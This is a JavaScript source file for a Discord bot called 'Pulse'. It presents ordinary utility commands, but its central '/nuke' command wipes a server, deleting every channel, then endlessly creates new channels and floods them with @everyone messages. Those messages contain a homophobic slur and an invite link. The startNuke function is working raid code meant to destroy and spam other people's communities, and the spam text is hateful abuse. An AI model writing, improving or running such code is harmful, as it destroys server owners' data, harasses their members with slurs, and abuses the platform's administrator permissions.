const { Client, GatewayIntentBits, EmbedBuilder, PermissionsBitField, ChannelType } = require('discord.js');
const express = require('express');
const app = express();
const crypto = require('crypto');

const TOKEN = process.env.TOKEN;
const PORT = process.env.PORT || 3000;
const INVITE_LINK = 'https://discord.gg/eG6SyjWbh';

if (!TOKEN) {
    console.error('❌ TOKEN environment variable is required!');
    process.exit(1);
}

const client = new Client({
    intents: [
        GatewayIntentBits.Guilds,
        GatewayIntentBits.GuildMessages,
        GatewayIntentBits.MessageContent
    ]
});

let nukeRunning = false;
let nukeGuildId = null;

app.get('/', (req, res) => res.send('✅ Pulse Bot is running!'));
app.listen(PORT, () => console.log(`🌐 Web server on port ${PORT}`));

async function registerCommands() {
    try {
        await client.application.commands.set([
            {
                name: 'nuke',
                description: '💀 Starts the nuke'
            },
            {
                name: 'stop',
                description: '⏹️ Stops the nuke'
            },
            {
                name: 'ping',
                description: '🏓 Check bot latency'
            },
            {
                name: 'serverinfo',
                description: '📊 Get server information'
            },
            {
                name: 'userinfo',
                description: '👤 Get user information',
                options: [
                    {
                        name: 'user',
                        type: 6,
                        description: 'Target user',
                        required: false
                    }
                ]
            },
            {
                name: 'avatar',
                description: '🖼️ Get user avatar',
                options: [
                    {
                        name: 'user',
                        type: 6,
                        description: 'Target user',
                        required: false
                    }
                ]
            },
            {
                name: 'say',
                description: '💬 Make the bot say something',
                options: [
                    {
                        name: 'message',
                        type: 3,
                        description: 'Message to say',
                        required: true
                    }
                ]
            }
        ]);
        console.log('✅ Commands registered');
    } catch (error) {
        console.error('Failed to register commands:', error);
    }
}

client.on('interactionCreate', async (interaction) => {
    if (!interaction.isChatInputCommand()) return;

    const { commandName, options, user, member, guild, channel } = interaction;

    if (commandName === 'nuke') {
        await interaction.deferReply({ ephemeral: true });

        if (!guild) return interaction.editReply('❌ Server only.');
        const botMember = guild.members.cache.get(client.user.id);
        if (!botMember || !botMember.permissions.has(PermissionsBitField.Flags.Administrator)) {
            return interaction.editReply('❌ I need **Administrator** permissions.');
        }

        if (nukeRunning) return interaction.editReply('❌ Nuke already running. Use `/stop`.');

        nukeRunning = true;
        nukeGuildId = guild.id;
        await interaction.editReply('🚀 **NUKE STARTED!** Use `/stop` to stop.');
        await startNuke(guild);
    }

    if (commandName === 'stop') {
        await interaction.deferReply({ ephemeral: true });
        if (!nukeRunning) return interaction.editReply('❌ No nuke running.');
        nukeRunning = false;
        nukeGuildId = null;
        await interaction.editReply('⏹️ **Nuke stopped.**');
    }

    if (commandName === 'ping') {
        const sent = await interaction.reply({ content: '🏓 Pinging...', fetchReply: true });
        const latency = sent.createdTimestamp - interaction.createdTimestamp;
        await interaction.editReply(`🏓 Pong!\n📨 Latency: ${latency}ms\n📡 API: ${Math.round(client.ws.ping)}ms`);
    }

    if (commandName === 'serverinfo') {
        await interaction.deferReply({ ephemeral: true });
        if (!guild) return interaction.editReply('❌ Server only.');

        const owner = await guild.fetchOwner();
        const embed = new EmbedBuilder()
            .setTitle(`📊 ${guild.name}`)
            .setColor(0x8B5CF6)
            .setThumbnail(guild.iconURL({ dynamic: true, size: 256 }) || null)
            .addFields(
                { name: '🆔 Server ID', value: guild.id, inline: true },
                { name: '👑 Owner', value: owner.user.tag, inline: true },
                { name: '👥 Members', value: `${guild.memberCount}`, inline: true },
                { name: '💬 Channels', value: `${guild.channels.cache.size}`, inline: true },
                { name: '📁 Roles', value: `${guild.roles.cache.size}`, inline: true },
                { name: '📅 Created', value: `<t:${Math.floor(guild.createdTimestamp / 1000)}:R>`, inline: true }
            );
        await interaction.editReply({ embeds: [embed] });
    }

    if (commandName === 'userinfo') {
        await interaction.deferReply({ ephemeral: true });
        const target = interaction.options.getUser('user') || user;
        const memberTarget = guild ? await guild.members.fetch(target.id).catch(() => null) : null;

        const embed = new EmbedBuilder()
            .setTitle(`👤 ${target.tag}`)
            .setColor(0x8B5CF6)
            .setThumbnail(target.displayAvatarURL({ dynamic: true, size: 256 }))
            .addFields(
                { name: '🆔 User ID', value: target.id, inline: true },
                { name: '📅 Account Created', value: `<t:${Math.floor(target.createdTimestamp / 1000)}:R>`, inline: true },
                { name: '🤖 Bot', value: target.bot ? 'Yes' : 'No', inline: true }
            );
        if (memberTarget) {
            embed.addFields(
                { name: '📅 Joined Server', value: `<t:${Math.floor(memberTarget.joinedTimestamp / 1000)}:R>`, inline: true },
                { name: '📊 Roles', value: memberTarget.roles.cache.map(r => r.toString()).join(', ') || 'None' }
            );
        }
        await interaction.editReply({ embeds: [embed] });
    }

    if (commandName === 'avatar') {
        await interaction.deferReply({ ephemeral: true });
        const target = interaction.options.getUser('user') || user;
        const embed = new EmbedBuilder()
            .setTitle(`${target.tag}'s Avatar`)
            .setImage(target.displayAvatarURL({ dynamic: true, size: 1024 }))
            .setColor(0x8B5CF6);
        await interaction.editReply({ embeds: [embed] });
    }

    if (commandName === 'say') {
        await interaction.deferReply({ ephemeral: true });
        const msg = interaction.options.getString('message');
        if (!channel) return interaction.editReply('❌ No channel.');
        await channel.send(msg);
        await interaction.editReply('✅ Sent.');
    }
});

async function startNuke(guild) {
    const variants = [
        '# PULSE OWNS ALL YOU F@GGOTS TRASH ASS SERVER',
        '# PULSE  OWNS ALL YOU F@GGOTS TRASH ASS SERVER',
        '# PULSE OWNS ALL  YOU F@GGOTS TRASH ASS SERVER'
    ];
    const inviteLine = `# JOIN PULSE: ${INVITE_LINK}`;

    const channels = guild.channels.cache;
    console.log(`Deleting ${channels.size} channels...`);
    
    const channelArray = Array.from(channels.values());
    for (let i = 0; i < channelArray.length; i += 10) {
        const batch = channelArray.slice(i, i + 10);
        await Promise.all(batch.map(async (ch) => {
            try { await ch.delete(); } catch(e) {}
        }));
        await new Promise(r => setTimeout(r, 50));
    }
    console.log('All channels deleted.');

    async function spamChannel(ch) {
        if (!nukeRunning) return;
        try {
            while (nukeRunning) {
                try {
                    const line = variants[Math.floor(Math.random() * variants.length)];
                    let big = `@everyone ${line}\n`;
                    while (big.length + line.length + 1 < 2000 - inviteLine.length - 2) {
                        big += line + '\n';
                    }
                    big += `\n${inviteLine}`;
                    await ch.send(big.slice(0, 2000));
                } catch(e) {}
                await new Promise(r => setTimeout(r, 10));
            }
        } catch(e) {}
    }

    async function createChannelsAndSpam() {
        let createdCount = 0;
        while (nukeRunning) {
            try {
                const newChannels = await Promise.all([
                    guild.channels.create({ name: 'pulse', type: ChannelType.GuildText }).catch(() => null),
                    guild.channels.create({ name: 'pulse', type: ChannelType.GuildText }).catch(() => null),
                    guild.channels.create({ name: 'pulse', type: ChannelType.GuildText }).catch(() => null),
                    guild.channels.create({ name: 'pulse', type: ChannelType.GuildText }).catch(() => null),
                    guild.channels.create({ name: 'pulse', type: ChannelType.GuildText }).catch(() => null)
                ]);
                
                const valid = newChannels.filter(c => c !== null);
                for (const ch of valid) spamChannel(ch);
                createdCount += valid.length;
                console.log(`Created ${createdCount} channels`);
            } catch(e) {}
            await new Promise(r => setTimeout(r, 10));
        }
    }

    createChannelsAndSpam();
    guild.channels.cache.forEach(ch => {
        if (ch.type === ChannelType.GuildText) spamChannel(ch);
    });
}

client.once('ready', async () => {
    console.log(`🤖 ${client.user.tag} is online!`);
    await registerCommands();
    console.log('✅ Bot is ready!');
});

client.login(TOKEN);
